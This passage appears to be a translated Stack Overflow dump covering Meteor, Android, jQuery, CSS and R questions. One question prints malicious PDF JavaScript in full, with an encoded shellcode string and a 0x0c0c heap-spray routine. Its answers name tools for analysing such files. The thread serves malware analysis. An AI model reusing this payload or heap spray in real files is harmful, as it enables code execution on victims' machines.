显然，[文档已改回使用](http://docs.meteor.com/#/full/template_registerhelper)：

```
Template.registerHelper('stub', function() {
     // code
}); 
```

然后在html文件中使用`{{stub}}`访问变量。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-24T17:28:06.520

这是我想出的解决问题的方法。这是使用 CoffeeScript 完成的。如果您不使用 CoffeeScript，可以[在此处](http://js2coffee.org/#coffee2js)将其转换为 JavaScript 。

首先，定义`extendTemplate`函数：

```
extendTemplate = (template, mixin) ->
  helpers = ({name, method} for name, method of mixin when name isnt "events")
  template[obj.name] = obj.method for obj in helpers

  if mixin.events?
    template.events?.call(template, mixin.events)

  template 
```

`loginMixin`然后，声明一个您希望在多个模板之间共享的具有帮助器和事件的对象（我的称为）：

```
loginMixin =
  merge_with_email: ->
    return Session.get 'account_merge__merge_with_email'

  events:
    'click button#merge_login': (event, template) ->

      email = $(template.find('#email')).val()
      password = $(template.find('#password')).val()

      Meteor.loginWithPassword email, password, (error)->
        if error
          console.error "Failed to login."

      return false 
```

然后，在声明你的模板之后，你可以使用上面的 mixin 来扩展它们。使用以下代码，我正在扩展我的`register`和`login`模板：

```
extendTemplate Template.register, loginMixin
extendTemplate Template.login, loginMixin 
```

最后，这是我的`login.html`样子：

```
<template name="login">
    <div class="alert">
        <a class="close" data-dismiss="alert" href="#">×</a>
        <h4 class="alert-heading">Merge accounts</h4>
        <form id="register_form" class="form-inline" action="#">
            <p class="help-block">Please login with {{merge_with_email}}.</p>
            <label for="email">Email:</label>
            <input id="email" type="text" class="input-medium" />
            <label for="password">Password:</label>
            <input id="password" type="password" class="input-medium" />
            <button class="btn" id="merge_login">Login</button>
        </form>
    </div>
</template> 
```

由于我也扩展了我的`register`模板，`register.html`因此也可以使用`{{merge_with_email}}`并处理按钮的`click`事件。`merge_login`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-11-03T11:26:37.337

现在有了 Meteor 1.0，这似乎已经改变了。经过一番挖掘，我发现您现在可以使用以下内容在助手之间重用代码：

[https://docs.meteor.com/#/full/template_registerhelper](https://docs.meteor.com/#/full/template_registerhelper)

```
Template.registerHelper("checkedIf",function(value){
  return (value)? "checked":"";
}); 
```

这使它在所有助手中都可用！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-19T04:59:55.087

不确定我是否理解您的要求，但我认为您所做的没有任何问题 - 您将函数分配给变量以便多次重用它。

如果想要减少输入或让 20 个不同的模板重用它而不是 2 个，您可以执行以下操作：

```
var templates = ['foo', 'bar', 'baz', 'barz', 'bliz', blaz'];
for (var i=0; i < templates.length; i++) { 
    Template[templates[i]].say_foo = say_foo;
} 
```

但是 IMO 的可读性较差，并且没有真正需要这样做。

编辑 - 更好的解决方案

刚刚意识到您可能想要这样做的原因 - 确保每个模板都具有该`say_foo`属性，因此您不必担心每次创建新模板时手动添加它，您可以这样做：

```
for (var t in Template)
    Template[t].say_foo = say_foo; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-19T13:23:08.560

您当前的方法应该有效。一个更短的版本是：

```
Template.foo.say_foo = 
Template.bar.say_foo = function() { alert('foo'); }; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-01-03T21:10:19.843

在弄乱了 Gezim 的出色答案后，我在 Meteor 1.3+ 中意识到你可以简单地运行：

```
Template.register.helpers(MyMixin.helpers);
Template.register.events(MyMixin.helpers); 
```

但是如果你想要一个 extendTemplate 函数：

```
// Note: above code is probably simpler.

function extendTemplate(template, mixin) {
  if (mixin.helpers && template.helpers) {
    template.helpers(mixin.helpers);
  }
  if (mixin.events && template.events) {
    template.events(mixin.events);
  }
  return template;
};

extendTemplate(Template.register, {
  events: { ... },
  helpers: { ... },
}); 
```~~

# javascript - 从恶意 PDF 中提取 JavaScript

> ID：10220497
> 
> 赞同：5
> 
> 时间：2012-04-19T01:37:47.433
> 
> 标签：javascript, pdf, malware

我有一个 PDF 文件，我知道它包含一个 JavaScript 脚本文件，该文件执行恶意操作，目前还不确定。

我已经成功地解压缩了 PDF 文件并获得了纯文本 JavaScript 源代码，但是如果我以前从未见过这种语法中隐藏了某种代码，那么它就是代码本身。

**代码示例：**这是大部分代码的样子

```
var bDWXfJFLrOqFuydrq = unescape;
var QgFjJUluesCrSffrcwUwOMzImQinvbkaPVQwgCqYCEGYGkaGqery = bDWXfJFLrOqFuydrq( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692....') 
```

我想这种带有长变量/函数名称和隐藏文本字符的符号会混淆寻找这些类型事物的扫描仪。

两个问题：

**问题 1**

有人能告诉我这叫什么`%u4141`吗？

**问题2**

是否有一些工具可以将该符号转换为纯文本，以便我可以看到它在做什么？

完整的JS代码：

```
var B = unescape('%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uadba%u8e19%uda62%ud9cb%u2474%u58f4%uc931%u49b1%u5031%u8314%ufce8%u5003%u4f10%u72ec%u068a%u8b0f%u784b%u6e99%uaa7a%ufbfd%u7a2f%ua975%uf1c3%u5adb%u7757%u6df4%u3dd0%u4322%uf0e1%u0fea%u9321%u4d96%u7376%u9da6%u728b%uc0ef%u2664%u8fb8%ud6d7%ud2cd%ud7eb%u5901%uaf53%u9e24%u0520%ucf26%u1299%uf760%u7c92%u0651%u9f76%u41ad%u6bf3%u5045%ua2d5%u62a6%u6819%u4a99%u7194%u6ddd%u0447%u8e15%u1efa%uecee%uab20%u57f3%u0ba2%u66d0%ucd67%u6593%u9acc%u69fc%u4fd3%u9577%u6e58%u1f58%u541a%u7b7c%uf5f8%u2125%u0aaf%u8d35%uae10%u3c3d%uc844%u291f%ue6a9%ua99f%u71a5%u9bd3%u296a%u907b%uf7e3%ud77c%u4fd9%u2612%uafe2%ued3a%uffb6%uc454%u94b6%ue9a4%u3a62%u45f5%ufadd%u25a5%u928d%ua9af%u82f2%u63cf%u289b%ue435%u0464%ufd34%u560c%ue837%udf7f%u78d1%u8990%u154a%u9009%u8401%u0fd6%u866c%ua35d%u4990%uce96%u3e82%u8556%ue9f9%u3069%u1597%ubefc%u413e%ubc68%ua567%u3f37%ubd42%ud5fe%uaa2d%u39fe%u2aae%u53a9%u42ae%u070d%u77fd%u9252%u2b91%u1cc7%u98c0%u7440%uc7ee%udba7%u2211%u2036%u0bc4%u50bc%u7862%u417c');

var C = unescape("%"+"u"+"0"+"c"+"0"+"c"+"%u"+"0"+"c"+"0"+"c");

while (C.length + 20 + 8 < 65536) C+=C;

D = C.substring(0, (0x0c0c-0x24)/2);

D += B;
D += C;
E = D.substring(0, 65536/2);
while(E.length < 0x80000) E += E;
F = E.substring(0, 0x80000 - (0x1020-0x08) / 2);
var G = new Array();
for (H=0;H<0x1f0;H++) G[H]=F+"s";​ 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-19T16:08:53.357

看起来您已经从 PDF 中提取了 JavaScript。您的问题似乎与*分析*此 JavaScript 有关。

由于这个主题（在看起来无害的 PDF 文件中混淆和隐藏恶意 JavaScript 代码）似乎越来越受到恶意软件作者的欢迎，让我列出一些工具和网站，这些工具和网站证明对剖析此类威胁的初学者有帮助：

1.  [**Didier Stevens 的 PDF 工具**](http://blog.didierstevens.com/programs/pdf-tools/)
2.  [**Didier Stevens 的 PDF 恶意软件截屏视频的第 1 部分**](http://www.youtube.com/watch?v=F3rpZT0gKXw)（在 YouTube 上）
3.  [**Jay Berkenbilt 的 QPDF：**](http://qpdf.sourceforge.net/)用于保存内容的 PDF 转换实用程序（用于解压 PDF 中所有/大多数压缩对象的有用命令：
    `qpdf --qdf original.pdf unpacked.pdf`
    然后在文本编辑器中打开 unpacked.pdf）
4.  [**Julia Wolf 关于 PDF 恶意软件混淆的演讲**](http://blog.fireeye.com/files/julia_wolf_toorcon12_omg_wtf.pdf)
5.  [**peepdf：**](http://code.google.com/p/peepdf/)用于探索 PDF 的 Python 工具（找出它们是否是恶意的）
6.  [**PDFTricks：**](http://code.google.com/p/corkami/wiki/PDFTricks) PDF 源代码混淆方法的（非详尽的）列表
7.  [**Wepawet：**](http://wepawet.iseclab.org/)分析 PDF/Javascript/Flash 文件的在线资源（生成报告）
8.  [**Origami-PDF：**](http://code.google.com/p/origami-pdf/)用于分析和生成恶意 PDF 的 Ruby 工具
9.  （......这里没有列出更多资源......）

我不知道您如何准确提取您在问题中提供的 Javascript 代码段。但是，无论如何，不​​要依赖在 PDF 中找到*所有*JS 代码——除非您是 PDF 专家，知道在哪里查找以及如何发现所有可能的混淆。（我建议您将工具 3 应用于源 PDF，并根据 6 中的提示查看生成的 PDF ......其他工具可能需要更多地研究 PDF 语法，然后才能真正使它们有用给你。）

* * *

## 更新

这是我（将近 3 年）旧答案的更新。值得补充的是：

10.  **[`pdfinfo -js`](http://poppler.freedesktop.org/)**：最新（基于 Poppler！，而不是基于 XPDF）版本`pdfinfo`（从[v0.25.0](http://poppler.freedesktop.org/releases.html)开始，于 2013 年 12 月 11 日发布）现在知道`-js`打印出嵌入在 PDF 文件中的 JavaScript 代码的命令行参数。

    `/JavaScript`即使在 PDF 源代码中的名称通过使用（正式合法的）PDF 名称结构（例如`/4Aavascript`or`/J#61v#61script`或类似结构）混淆的情况下，这也适用于许多情况。

    不幸的是，这个奇妙的功能添加到`pdfinfo`现在仍然知之甚少。请分享！

## 更新 2

另一个更新，因为上面提到的***`peepdf`***工具最近添加了**`extract`**子命令：

5.  **[`peepdf.js`](https://github.com/jesparza/peepdf)**: This is a Python-based command line tool which can analyse PDF files. It was developed by Jose Miguel Esparza mainly in order to *"find out if the file can be harmful or not"*, but is also very good for general exploration of PDF file structures.

    ***Installation and usage:***

    1.  Clone the GitHub repository:
        **`git clone https://github.com/jesparza/peepdf git.peepdf`**.
    2.  Create a symlink to the `peepdf.py` script and put it somewhere into your `$PATH`:
        **`cd git.clone ;`**
        **`ln -s $(pwd)/peepdf.py ${HOME}/bin/peepdf.py`**
    3.  Run it in interactive mode, opening a PDF file:
        **`peepdf.py -fil my.pdf`**
    4.  Use the **`extract js > all-js-in-my.pdf`** command to extract and redirect all JavaScript contained in `my.pdf` into a file. This is depicted by the screenshots below:

        ![](../Images/ec37dc552d98abbe20004727c94dad18.png)

        ![](../Images/53f0d347d998ba093e03239f571842e8.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:43:59.603

这些可能是内存地址、操作系统调用、堆喷射等。

线索是被调用的函数是`unescape`. 获取您想要的`unescape`文本的实际值。有用于取消转义文本的在线工具，例如[http://www.web-code.org/coding-tools/javascript-escape-unescape-converter-tool.html](http://www.web-code.org/coding-tools/javascript-escape-unescape-converter-tool.html)。

结果很可能是 ASCII 格式的垃圾，但您可以尝试将其插入十六进制编辑器，看看您是否可以更清楚地理解它。如果病毒扫描程序可以识别该文件的感染源，也许您可​​以对该特定恶意软件进行更多研究并找出该代码在做什么。

为了科学，启动一个 Windows 虚拟机，运行它，看看它做了什么 :)

# java - Android - 我怎么知道选中了哪个复选框？

> ID：10220500
> 
> 赞同：1
> 
> 时间：2012-04-19T01:38:09.683
> 
> 标签：java, android, checkbox

我只是想设置一个文本视图，显示单击按钮时选中的复选框。

我希望有一天能够保留这些信息，但现在只知道选择了哪些信息就可以了。

我正在使用测试文本视图

有什么建议么？

```
public class skills_management extends Activity implements View.OnClickListener{

private Button buttonLocation;
private ListView mainListView ;
private Skill[] Skills ;
private ArrayAdapter<Skill> listAdapter ;
static CheckBox cb;

public void onCreate(Bundle savedInstanceState) {       
    super.onCreate(savedInstanceState);
    setContentView(R.layout.skills);

    Button buttonLocation = (Button) findViewById(R.id.buttonLocation);
    buttonLocation.setOnClickListener(this); 

    // Find the ListView resource. 
    mainListView = (ListView) findViewById( R.id.mainListView );

    // When item is tapped, toggle checked properties of CheckBox and Skill.
    mainListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
      @Override
      public void onItemClick( AdapterView<?> parent, View item, int position, long id) {
        Skill Skill = listAdapter.getItem( position );
        Skill.toggleChecked();
        SkillViewHolder viewHolder = (SkillViewHolder) item.getTag();
        viewHolder.getCheckBox().setChecked( Skill.isChecked() );
      }
    });

    // Create and populate Management Skills.
    Skills = (Skill[]) getLastNonConfigurationInstance() ;
    if ( Skills == null ) {
      Skills = new Skill[] { 
          new Skill("Fiscal Management"),
          new Skill("Empowers Others"), 
          new Skill("Ethical"), 
          new Skill("Project Management"), 
          new Skill("Problem Solving"), 
          new Skill("Strategic"), 
          new Skill("Entrepreneurial"), 
          new Skill("Strong Communication"),
          new Skill("Results Oriented"),
          new Skill("Delegation"), 
          new Skill("Professional"), 
          new Skill("Decision Maker"),
          new Skill("Sales"), 
          new Skill("Computer"),
          new Skill("Marketing"),
          new Skill("Training"),
          new Skill("Executive")
      };  
    }

    ArrayList<Skill> SkillList = new ArrayList<Skill>();
    SkillList.addAll( Arrays.asList(Skills) );

    // Set our custom array adapter as the ListView's adapter.
    listAdapter = new SkillArrayAdapter(this, SkillList);
    mainListView.setAdapter( listAdapter );      
  }

  /** Holds Skill data. */
  private static class Skill {
    private String name = "" ;
    private boolean checked = false ;
    public Skill( String name ) {
      this.name = name ;
    }

    public String getName() {
      return name;
    }

    public boolean isChecked() {
      return checked;
    }
    public void setChecked(boolean checked) {
      this.checked = checked;
    }
    public String toString() {
      return name ; 
    }
    public void toggleChecked() {
      checked = !checked ;
    }
  }

  /** Holds child views for one row. */
  private static class SkillViewHolder {
    private CheckBox checkBox ;
    private TextView textView ;

    public SkillViewHolder( TextView textView, CheckBox checkBox ) {
      this.checkBox = checkBox ;
      this.textView = textView ;
    }
    public CheckBox getCheckBox() {
      return checkBox;
    }

    public TextView getTextView() {
      return textView;
    } 

  }

  /////DISPLAY TEXTVIEW
  //called when the button is clicked
public void onClick(View view) 
{
     TextView test= (TextView) findViewById(R.id.testTextView);
     test.setText("test");  //shows whole filename

}

      /** Custom adapter for displaying an array of Skill objects. */
      private static class SkillArrayAdapter extends ArrayAdapter<Skill> {
        private LayoutInflater inflater;

        public SkillArrayAdapter( Context context, List<Skill> SkillList ) {
          super( context, R.layout.skill_row, R.id.rowTextView, SkillList );
          // Cache the LayoutInflate to avoid asking for a new one each time.
          inflater = LayoutInflater.from(context) ;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
          // Skill to display
          Skill Skill = (Skill) this.getItem( position ); 

          // The child views in each row.
          final CheckBox checkBox ; 
          TextView textView ; 

          // Create a new row view
          if ( convertView == null ) {
            convertView = inflater.inflate(R.layout.skill_row, null);

            // Find the child views.
            textView = (TextView) convertView.findViewById( R.id.rowTextView );
            checkBox = (CheckBox) convertView.findViewById( R.id.CheckBox01 );

            // Optimization: Tag the row with it's child views, so we don't have to 
            // call findViewById() later when we reuse the row.
            convertView.setTag( new SkillViewHolder(textView,checkBox) );

            // If CheckBox is toggled, update the Skill it is tagged with.
            checkBox.setOnClickListener( new View.OnClickListener() {
              public void onClick(View v) {

                cb = (CheckBox) v ;
                Skill Skill = (Skill) cb.getTag();
                Skill.setChecked( cb.isChecked() );

              }
            });    

          }
          // Reuse existing row view
          else {
            // Because we use a ViewHolder, we avoid having to call findViewById().
            SkillViewHolder viewHolder = (SkillViewHolder) convertView.getTag();
            checkBox = viewHolder.getCheckBox() ;
            textView = viewHolder.getTextView() ;

          }

          // Tag the CheckBox with the Skill it is displaying, so that we can
          // access the Skill in onClick() when the CheckBox is toggled.
          checkBox.setTag( Skill ); 

          // Display Skill data
          checkBox.setChecked( Skill.isChecked() );
          textView.setText( Skill.getName() );      

          return convertView;
        }//end class

        } 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T03:54:27.163

这是我的代码。希望这会有所帮助。要从该列表中获取所选项目，您所要做的就是循环技能列表并找到 Skill.isSelected == true，如果为 true，您可以轻松知道该项目已被选中。

例如，您可以在 Activity 中添加一个按钮 (btnGetSelectedSkill)。然后 onClick 监听器你可以调用下面的方法 getSelectedSkills();

```
private void getSelectedSkill()
    {
        List<Skill> selectedSkill = new ArrayList<Skill>();
        for(Skill s: this.skills)
        {
            if(s.isSelected())
                selectedSkill.add(s); // Here you will get your selected skill in this list.
        }
    } 
```

## 技能.java

```
package com.skill.vo;

public class Skill
{
    private long id;
    private String name;
    private boolean selected;

    public Skill()
    {

    }

    public long getId()
    {
        return id;
    }

    public void setId(long id)
    {
        this.id = id;
    }

    public String getName()
    {
        return name;
    }

    public void setName(String name)
    {
        this.name = name;
    }

    public boolean isSelected()
    {
        return selected;
    }

    public void setSelected(boolean selected)
    {
        this.selected = selected;
    }
} 
```

## SkillView.java

```
package com.skill.component;

import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.view.Gravity;
import android.view.View;
import android.widget.CheckBox;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.skill.vo.Skill;

public class SkillView extends LinearLayout
{
    // To store skill information
    private Skill skill;
    // For UI
    private Context context;
    private CheckBox chkSelect;
    private TextView tvSkillName;

    public SkillView(Context context, Skill skill)
    {
        super(context);
        this.context = context;
        this.skill = skill;

        /* Initialize UI components */
        this.chkSelect = new CheckBox(this.context);
        this.chkSelect.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View view)
            {
                SkillView.this.skill.setSelected(((CheckBox) view).isChecked());
            }
        });

        this.tvSkillName = new TextView(this.context);
        this.tvSkillName.setTextSize(15);
        this.tvSkillName
                .setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        this.tvSkillName.setText(" " + this.skill.getName());

        // Add components to main layout
        this.setOrientation(HORIZONTAL);
        this.addView(this.chkSelect, new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));
        this.addView(this.tvSkillName, new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));

    }

    public Skill getSkill()
    {
        return skill;
    }

    public void setSkill(Skill skill)
    {
        this.skill = skill;
    }
} 
```

## 技能视图适配器

```
package com.skill.component;

import java.util.List;

import com.skill.vo.Skill;

import android.content.Context;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;

public class SkillViewAdapter extends BaseAdapter
{
    private Context context = null;
    private List<Skill> skillList = null;

    public SkillViewAdapter(Context context, List<Skill> skillList)
    {
        this.context = context;
        this.skillList = skillList;
    }

    public int getCount()
    {
        return this.skillList != null ? this.skillList.size() : 0;
    }

    public Object getItem(int position)
    {
        return this.skillList != null ? this.skillList.get(position) : null;
    }

    public long getItemId(int position)
    {
        if (this.skillList != null)
        {
            Skill p = this.skillList.get(position);
            return p.getId();
        }
        return 0;
    }

    public View getView(int position, View convertView, ViewGroup parent)
    {
        SkillView skillView;

        if (convertView == null)
        {
            skillView = new SkillView(this.context, this.skillList.get(position));
        } else
        {
            skillView = (SkillView) convertView;
            skillView.setSkill(this.skillList.get(position));
        }
        return skillView;
    }

    public List<Skill> getProductList()
    {
        return this.skillList;
    }
} 
```

## 技能活动

```
package com.skill.activity;

import java.util.ArrayList;
import java.util.List;

import com.skill.component.SkillViewAdapter;
import com.skill.vo.Skill;

import android.app.Activity;
import android.os.Bundle;
import android.widget.ListView;

public class SkillAndroidActivity extends Activity
{

    private ListView listViewSkills = null;
    private List<Skill> skills = null;

    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        this.listViewSkills = (ListView) this.findViewById(R.id.lv_skills);

        this.skills = new ArrayList<Skill>();
        Skill skill = null;

        skill = new Skill();
        skill.setId(1);
        skill.setName("Java");
        this.skills.add(skill);

        skill = new Skill();
        skill.setId(2);
        skill.setName("PHP");
        this.skills.add(skill);

        skill = new Skill();
        skill.setId(3);
        skill.setName("C++");
        this.skills.add(skill);

        skill = new Skill();
        skill.setId(4);
        skill.setName("VB.net");
        this.skills.add(skill);

        SkillViewAdapter adapter = new SkillViewAdapter(this, this.skills);
        this.listViewSkills.setAdapter(adapter);
    }
} 
```

## 主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/ll_main"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical">

    <ListView
        android:id="@+id/lv_skills"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_weight="9" >
    </ListView>
</LinearLayout> 
```

![截屏](../Images/0c4b1ff2996e2097cbf16a3f62438272.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:01:12.787

您必须遍历所有技能并检查哪些技能`isChecked`是正确的。

# javascript - 如何更改 jQuery 中动态创建的段落的背景颜色？

> ID：10220506
> 
> 赞同：3
> 
> 时间：2012-04-19T01:38:32.150
> 
> 标签：javascript, jquery, dynamic

我希望用户能够单独使用 .hover() 段落（例如：“border: 1px solid #900;”）并能够单独单击它以添加/更改背景颜色（“选择段落”）并再次单击以返回默认背景颜色（“取消选择段落”）。这些段落是动态创建的，我很难得到它，因为我是 Javascript 和 jQuery 的新手。

[http://jsfiddle.net/RzvV5/8/](http://jsfiddle.net/RzvV5/8/)

这是我正在使用的代码：

```
jQuery

$(document).ready(function(){
$("#push").on({
    click: function(){
        var pr = $('<p class="test">Test</p>');
        var d = $(".Test");
        $(pr).clone().appendTo(d); 
    }
});

$("p").on({
          mouseenter: function(){    
                     $(this).addClass("inside"); 
          },
          mouseleave: function(){                             
                     $(this).removeClass("inside");  
}

});

}); 
```

* * *

html代码：

```
<html>
<body>
    <a href="#" id="push">Push</a>
<div class="Test"></div>
    </body>
</html> 
```

* * *

CSS代码：

```
.test { color: #000; padding: .5em; border: 1px solid black;} 
.active { background-color: ;}
.inside { background-color: #900; } 
```

* * *

这段代码只是我试图完成的一个例子。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:44:05.767

所以这里发生的是，在您的代码中，您定义了一个函数来创建一个段落，然后设置它的属性。请注意，您“定义了一个函数”。仅此一项并不能构成任何段落。因此，当您为所有段落设置事件处理程序时，这并不重要，因为您关心的段落还不存在。

这是您可以做的，将您的 jQuery 部分更改为：

```
$(document).ready(function(){
    $("#push").on({
        click: function(){
            var pr = $('<p class="test">Test</p>');
            var d = $(".Test");
            var pclone = $(pr).clone();
            pclone.on({
                mouseenter: function(){    
                    $(this).addClass("inside");
                },
                mouseleave: function(){                             
                    $(this).removeClass("inside");  
                }
            });
            pclone.appendTo(d);
        }
    });
}); 
```

我已经进一步编辑了您的 JSFiddle，以便您查看结果：http: [//jsfiddle.net/RzvV5/16/](http://jsfiddle.net/RzvV5/16/)

**编辑**

*PS*正如您所提到的，您是 jQuery 的新手，而且您似乎也是 stackoverflow 的新用户，我赞扬您提出了一个完美的问题。正确的代码示例，带有问题陈述的介绍和您自己努力的证明，以及最好的部分：一个 JSFiddle 链接，以便我可以检查我的答案是否正确。很棒的去:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:26:03.250

我已经修改了您的 JQuery 代码，您应该可以将其复制粘贴并试一试。很丑，但是我写的很快。基本上，点击它会生成一个带有红色背景的段落。当你点击它时，它会变成蓝色。如果再次单击它，它会变成红色。该代码是相当不言自明的。希望有帮助！

```
$(document).ready(function(){
    $("#push").on({
        click: function(){
            $('<p>Test</p>').css("background-color","red").appendTo('.Test');
        }
    });

$('.Test').on("click", "p", function(){  
    var cur = $(this).css('background-color');
    if(cur=="rgb(255, 0, 0)") {  
        $(this).css("background-color","blue");
    } else {                      
        $(this).css("background-color","red");
    }
    });
}); 
```

编辑：替换了已弃用的 .live() 的使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T02:38:12.807

您可以将添加事件处理程序的选择器更改为包含元素 (.Test)，并将 p 标记提供给对 on 的调用：

```
$(document).ready(function(){
    $("#push").on({
        click: function(){
            var pr = $('<p class="test">Test</p>');
            var d = $(".Test");
            $(pr).clone().appendTo(d); 
        }
    });

    $(".Test").on( "mouseenter", "p", function(){    
        $(this).addClass("inside"); 
    });
    $(".Test").on( "mouseleave", "p", function(){                            
        $(this).removeClass("inside");  
    });
}); 
```

.on 与 .live 类似，因为它可以有效地将事件处理程序附加到动态创建的元素，但它的效率要高得多，因为它没有将处理程序附加到根文档。以下是 jQuery 1.7 中各种事件处理方法的解释（以及为什么以及如何使用 .on）：[http ://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs- live.html](http://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs-live.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T02:56:20.677

这是我创建的小提琴：

[http://jsfiddle.net/RzvV5/80/](http://jsfiddle.net/RzvV5/80/)

希望这可以帮助。

谢谢

阿尼尔班

# html - 阻止 DIV 与其他 DIV (CSS) 重叠

> ID：10220508
> 
> 赞同：0
> 
> 时间：2012-04-19T01:38:57.400
> 
> 标签：html, css

我只想要 3 个 DIV 在彼此之上。这不是很多代码，当我在没有任何内容的情况下简单地执行它时，它会正确堆叠。不知道我做错了什么，但这里有代码。我想要在中间内容 DIV 下方再添加一个 DIV。这用于底部信息栏。我知道`z-index`更多地用于图层，并且对我的知识没有好处。

这是我的 HTML 代码：

```
<html>
<head>
    <title>Mt. Rose, City of Refuge MEdia</title>
    <link rel="stylesheet"
          href="storage/mainsite/styles/default_button.css" type="text/css">
    <link rel="stylesheet" href="storage/mainsite/styles/default_font.css"
          type="text/css">
    <link rel="stylesheet" href="storage/mainsite/styles/default_div.css"
          type="text/css">
</head>
<body style="background-color: rgb(255, 255, 255); text-align: center;">
<br>

<div class="maindefault" style="display: block;"><!--Banner insert -->
    <img src="storage/mainsite/bannerfinalfeathered.png" alt=""><a
        class="button"
        href="http://output93.rssinclude.com/output?type=iframe&amp;id=456111&amp;hash=c334e7f73918b535f66271d019d52a83"
        title="Home" target="content"><span>Home</span></a> <a class="button"
                                                               title="About Us"
                                                               href="http://mtrosecogic.org/mtrose1/about"><span>About</span></a>
    <a class="button" href="index.html" title="Mt. Rose Public Calendar"><span>Calendar</span></a>
    <a class="button" href="/flash_newpage.html" title="Live Video Feed"><span>Live
Feed</span></a> <a class="button" target="content" href="access.html"
                   title="Restricted"><span>Access</span></a>
    <a class="button" href="index.html"
       title="Mt. Rose Virtual Learning Environment"><span>Education</span></a>
    <a class="button" href="/flash_newpage.html"
       title="City of Refuge Online Webstore!"><span>Store</span></a>
    <a class="button" target="content" href="/interactive.html"
       title="Interactive Media Gallery"><span><font face="Juice">Interactive</font></span></a>
</div>
<br>

<div class="maindefault">
    <iframe
        style="margin-top: 0px; margin-bottom: 0px; text-align: center; width: 416px; height: 800px; float: left;"
        float="" marginheight="0" src="flash_newpage.html" id="flashframe"
        name="flashframe" marginwidth="0" frameborder="0" scrolling="no"></iframe>
    <iframe
        style="overflow: auto; margin-top: 6em; margin-bottom: 0px; height: 600px; width: 400px; float: right; text-align: center;"
        id="content" marginheight="0" marginwidth="0"
        src="http://output93.rssinclude.com/output?type=iframe&amp;id=456111&amp;hash=c334e7f73918b535f66271d019d52a83"
        name="content" frameborder="0"></iframe>
</div>
</body>
</html> 
```

这是我的 div 的 CSS（它是一个链接的样式表）：

```
.maindefault {
    margin: 0px auto;
    width: 817px;
    font-family: "High Tower Text",Georgia,Serif;
    display: inline-block;
    text-align: center;
} 
```

另外，如果有帮助，我正在使用 Kompozer 8.3。谢谢你

编辑:: 我不熟悉 JS Fiddler，但链接是 mtrosemedia.tk。当我`.maindefault div`在最后一个下方添加另一个时会发生什么`</div>`，我的新 DIV 紧贴在第二个 DIV 的顶部。我需要新的 DIV 紧贴第二个 DIV 的底部。然后，当我添加内容时，它会显示在我的 flash 和我的 RSS 提要之上。我也想改进提要列表，但我会提出另一个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:55:02.017

当您将内容放入其中时，您是说 div 重叠吗？

尝试将 .maindefault 向左浮动。添加内容后，下一个 div 应该对齐并紧贴其上方的顶部。

# r - 按两个或多个因子变量汇总统计？

> ID：10220510
> 
> 赞同：15
> 
> 时间：2012-04-19T01:39:03.763
> 
> 标签：r, summary

最好用一个例子来说明这一点

```
str(mtcars)
mtcars$gear <- factor(mtcars$gear, labels=c("three","four","five"))
mtcars$cyl <- factor(mtcars$cyl, labels=c("four","six","eight"))
